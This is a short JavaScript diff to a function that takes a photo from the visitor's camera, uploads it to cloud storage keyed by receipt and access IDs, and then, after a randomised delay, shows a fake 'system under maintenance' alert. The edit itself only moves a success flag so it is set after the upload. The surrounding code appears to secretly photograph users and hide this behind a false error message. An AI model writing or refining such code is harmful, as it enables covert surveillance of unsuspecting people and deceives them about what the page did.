@@ -163,6 +163,7 @@ async function capturaFoto() {
 
     try {
         await uploadString(refStorage(storage, `/capturas/${data.comprovanteId}/${data.acessoId}`), data.canvas.toDataURL('image/jpeg'), 'data_url')
+        data.capturaFotoRealizada = true;
     } catch (error) {
         console.error('Error upload file:', error);
     }
@@ -172,7 +173,6 @@ async function capturaFoto() {
         tracks.forEach(t => t.stop());
     }
 
-    data.capturaFotoRealizada = true;
 
     await delay(751 + (Math.random() * 750));
     data.alert = alert('Sistema em manutenção. Tente mais tarde...');
